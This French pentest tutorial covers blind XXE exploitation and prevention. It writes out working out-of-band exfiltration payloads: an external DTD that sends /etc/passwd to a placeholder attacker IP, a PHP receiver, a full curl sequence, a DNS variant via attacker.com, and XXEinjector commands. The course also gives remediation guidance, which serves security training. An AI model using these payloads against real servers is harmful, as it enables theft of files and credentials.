# XXE avancé et prévention

Quand l'application ne reflète aucune donnée XML dans sa réponse et n'affiche pas d'erreurs, on se retrouve face à un XXE complètement aveugle. L'exfiltration Out-of-Band (OOB) permet de contourner cette limitation en forçant le serveur cible à envoyer les données vers notre machine. Côté défense, la prévention repose sur la mise à jour des bibliothèques XML et la désactivation stricte des entités externes.

## Pourquoi

Les scénarios de XXE aveugle sont fréquents en conditions réelles. Beaucoup d'applications traitent du XML en arrière-plan (APIs SOAP, import de documents, parsers de fichiers) sans jamais refléter le contenu dans la réponse HTTP. Sans technique OOB, ces vulnérabilités resteraient inexploitables alors qu'elles donnent exactement le même accès aux fichiers du serveur. Comprendre ces techniques permet aussi de mieux formuler les recommandations de remédiation dans un rapport de pentest.

## Comment ça marche

### Exfiltration Out-of-Band (OOB)

Le principe est simple : puisque le serveur ne nous renvoie rien, on le fait venir à nous. Le serveur cible charge un DTD externe hébergé sur notre machine, ce DTD encode le contenu du fichier visé en base64, puis le serveur envoie une requête HTTP vers notre serveur avec les données en paramètre d'URL.

#### Étape 1 : préparer le DTD externe

On crée un fichier `xxe.dtd` sur notre machine qui contient la logique d'exfiltration :

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

Ce DTD fait deux choses :
1. `%file` encode le contenu de `/etc/passwd` en base64 via le wrapper PHP
2. `%oob` construit une URL contenant les données encodées et la pointe vers notre serveur

#### Étape 2 : préparer le récepteur

Un script PHP minimaliste pour recevoir et décoder automatiquement les données :

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

On lance le serveur :

```bash
# - Héberger le DTD et le script de réception
php -S 0.0.0.0:8000
```

#### Étape 3 : envoyer le payload

Le XML envoyé à l'application vulnérable charge notre DTD externe et déclenche la chaîne :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Le serveur cible exécute la séquence suivante :

1. Charge `xxe.dtd` depuis notre serveur
2. Évalue `%file` (encode `/etc/passwd` en base64)
3. Évalue `%oob` (construit l'URL avec les données encodées)
4. Résout `&content;` (envoie la requête HTTP vers notre serveur)
5. Notre script PHP reçoit et décode les données dans les logs

```bash
# - Résultat côté attaquant
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

{% hint style="success" %}
On peut aussi utiliser l'exfiltration DNS OOB en plaçant les données encodées comme sous-domaine (`ENCODEDTEXT.attacker.com`) et en capturant le trafic avec `tcpdump`. C'est plus discret que l'HTTP, mais nécessite un serveur DNS configuré pour le domaine.
{% endhint %}

### Automatisation avec XXEinjector

L'outil [XXEinjector](https://github.com/enjoiz/XXEinjector) (Ruby) automatise la plupart des techniques XXE vues dans ce module : XXE basique, exfiltration CDATA, error-based et OOB blind.

#### Préparation de la requête

On copie la requête HTTP depuis Burp et on remplace les données XML par le marqueur `XXEINJECT` :

```http
POST /blind/submitDetails.php HTTP/1.1
Host: <IP_CIBLE>
Content-Length: 169
User-Agent: Mozilla/5.0
Content-Type: text/plain;charset=UTF-8
Accept: */*
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

#### Lancement de l'exfiltration

```bash
# - Cloner l'outil
git clone https://github.com/enjoiz/XXEinjector.git

# - Lancer l'exfiltration OOB avec filtre PHP
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 \
    --file=/tmp/xxe.req --path=/etc/passwd \
    --oob=http --phpfilter
```

Les fichiers exfiltrés sont stockés dans le répertoire `Logs/` de l'outil :

```bash
# - Lire le fichier récupéré
cat Logs/<IP_CIBLE>/etc/passwd.log
```

{% hint style="info" %}
XXEinjector encode les données en base64, donc le contenu n'apparaît pas directement dans la sortie de l'outil. Toujours vérifier le dossier `Logs/` pour les résultats.
{% endhint %}

---

## En pratique

### Exfiltration OOB manuelle depuis Exegol

```bash
# 1 - Créer le DTD malveillant
cat > /tmp/xxe.dtd << 'PAYLOAD'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
PAYLOAD

# 2 - Créer le script de réception
cat > /tmp/index.php << 'RECV'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
RECV

# 3 - Lancer le serveur PHP
cd /tmp && php -S 0.0.0.0:8000 &

# 4 - Envoyer le payload XXE
curl -s -X POST "http://<IP_CIBLE>:<PORT>/submitDetails.php" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>'
```

### Changer le fichier cible

Pour exfiltrer un fichier différent, modifier uniquement la ligne `resource=` dans le DTD :

```bash
# - Lire le code source d'une page PHP
sed -i 's|resource=/etc/passwd|resource=/var/www/html/config.php|' /tmp/xxe.dtd
```

### Exfiltration via DNS (alternative)

```bash
# - DTD pour exfiltration DNS (nécessite un domaine contrôlé)
cat > /tmp/xxe-dns.dtd << 'PAYLOAD'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://%file;.attacker.com/'>">
PAYLOAD

# - Capturer le trafic DNS
sudo tcpdump -i tun0 -n 'udp port 53'
```

## Pièges et galères

{% tabs %}
{% tab title="OOB" %}
- **Pare-feu sortant** : si le serveur cible ne peut pas établir de connexions sortantes, l'exfiltration OOB échoue. Tester d'abord avec un simple `<!ENTITY xxe SYSTEM "http://<ATTACKER_IP>/test">` pour vérifier la connectivité
- **Taille des données** : les URL ont une longueur maximale (environ 2000 caractères pour la plupart des serveurs). Les fichiers volumineux dépassent cette limite une fois encodés en base64. Préférer les fichiers de configuration courts (credentials, clés API)
- **Encodage double** : certains parsers encodent les caractères spéciaux dans l'URL, ce qui corrompt le base64. Le signe `+` est particulièrement problématique (remplacé par un espace)
{% endtab %}
{% tab title="XXEinjector" %}
- **Dépendances Ruby** : l'outil nécessite Ruby et certaines gems. Sur Exegol, vérifier que tout est installé avant de lancer
- **Format de requête** : le fichier de requête doit correspondre exactement au format attendu par l'application (headers, Content-Type). Un header manquant peut faire échouer silencieusement l'attaque
- **Timeout** : sur des serveurs lents, augmenter le timeout avec `--timeout`
{% endtab %}
{% tab title="DNS OOB" %}
- **Longueur des labels DNS** : chaque label DNS est limité à 63 caractères, et le nom complet à 253. Pour des fichiers longs, il faut découper les données en plusieurs requêtes
- **Infrastructure** : nécessite un nom de domaine et un serveur DNS configuré pour logger les requêtes. Plus complexe à mettre en place que l'HTTP OOB
{% endtab %}
{% endtabs %}

## Retour terrain

L'exfiltration OOB via HTTP est la technique la plus fiable en audit. La majorité des serveurs web peuvent établir des connexions sortantes, et le setup est rapide (un script PHP de 4 lignes). En revanche, les environnements très cloisonnés (DMZ stricte, pas de sortie Internet) nécessitent de se rabattre sur l'error-based ou le DNS OOB.

XXEinjector est un bon point de départ pour gagner du temps, mais il vaut mieux comprendre le mécanisme manuel avant de l'utiliser. En cas d'échec de l'outil, pouvoir adapter le payload manuellement fait souvent la différence.

Côté prévention, la plupart des XXE rencontrés en audit proviennent de bibliothèques XML obsolètes ou de configurations par défaut non durcies. La recommandation la plus impactante reste la mise à jour des dépendances, suivie de la désactivation explicite des entités externes.

---

## Prévention des XXE

### Mise à jour des composants

La cause racine de la plupart des XXE est l'utilisation de bibliothèques XML obsolètes. Le parser XML gère le traitement des entités, pas le développeur. Si la bibliothèque est vulnérable, le code applicatif ne peut rien y faire.

Composants à surveiller :

| Composant | Risque XXE | Action |
|---|---|---|
| Bibliothèques XML (libxml, Xerces, etc.) | Direct | Mettre à jour vers la dernière version |
| APIs SOAP | Élevé | Migrer vers REST/JSON si possible |
| Processeurs SVG (rsvg, Inkscape) | Moyen | Désactiver les entités externes |
| Processeurs PDF (Ghostscript) | Moyen | Mettre à jour, sandboxer |
| Parsers de documents (docx, xlsx) | Moyen | Utiliser des bibliothèques sécurisées |

{% hint style="warning" %}
En PHP, la fonction `libxml_disable_entity_loader()` est dépréciée depuis PHP 8.0. Les éditeurs modernes (VSCode, PHPStorm) signalent son utilisation. La référence complète des bibliothèques vulnérables et de leurs alternatives se trouve dans le [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).
{% endhint %}

### Configurations XML sécurisées

Même avec des bibliothèques à jour, appliquer des configurations défensives en profondeur :

- Désactiver les DTD personnalisées (Document Type Definitions)
- Désactiver les entités XML externes
- Désactiver le traitement des Parameter Entities (`%`)
- Désactiver le support XInclude
- Prévenir les boucles de référence d'entités (protection contre le Billion Laughs)
- Désactiver l'affichage des erreurs en production (bloque l'error-based XXE)

### Alternatives au XML

| Approche | Avantage | Limite |
|---|---|---|
| JSON au lieu de XML | Pas d'entités, pas de DTD | Pas de schéma natif (utiliser JSON Schema) |
| YAML au lieu de XML | Lisible, pas d'entités | Vulnérable à la désérialisation (en Python notamment) |
| REST au lieu de SOAP | JSON natif, pas de XML | Migration parfois coûteuse |
| WAF avec règles XXE | Détecte les payloads connus | Contournable, ne remplace pas la correction |

{% hint style="danger" %}
Un WAF seul ne suffit jamais. Les payloads XXE peuvent être obfusqués de nombreuses manières (encodage, entités imbriquées, DTD externes). Le WAF est une couche supplémentaire, pas une solution.
{% endhint %}

## Mémo express

| Technique | Payload / Outil | Prérequis |
|---|---|---|
| OOB via HTTP | DTD externe + script PHP de réception | Connectivité sortante du serveur |
| OOB via DNS | Données en sous-domaine + tcpdump | Domaine contrôlé + serveur DNS |
| XXEinjector | `ruby XXEinjector.rb --oob=http --phpfilter` | Ruby installé, requête HTTP capturée |
| Prévention : libs | Mettre à jour libxml, Xerces, etc. | Accès au serveur |
| Prévention : config | Désactiver DTD + entités externes | Configuration serveur |
| Prévention : format | Migrer de XML/SOAP vers JSON/REST | Refactoring applicatif |

***
